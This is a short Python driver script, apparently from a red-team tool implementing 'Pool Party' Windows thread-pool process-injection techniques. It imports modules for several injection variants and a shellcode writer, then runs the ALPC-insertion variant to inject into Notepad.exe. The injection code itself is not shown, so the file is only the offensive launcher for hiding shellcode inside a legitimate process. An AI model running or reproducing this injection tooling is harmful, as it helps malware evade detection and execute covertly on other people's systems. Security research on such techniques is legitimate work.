import write_shellcode
import winapi
import pool_party
import ctypes
import write_shellcode
import remote_tp_wait_insertion
import remote_tp_work_insertion
import remote_tp_io_insertion
import remote_tp_alpc_insertion
import remote_tp_job_insertion
import remote_tp_direct_insertion
import remote_tp_timer_insertion
import worker_factory

if __name__ == '__main__':
    remote_tp_alpc_insertion = remote_tp_alpc_insertion.RemoteTPAlpcInsertion("Notepad.exe") #windows 10: notepad.exe
    remote_tp_alpc_insertion.inject()





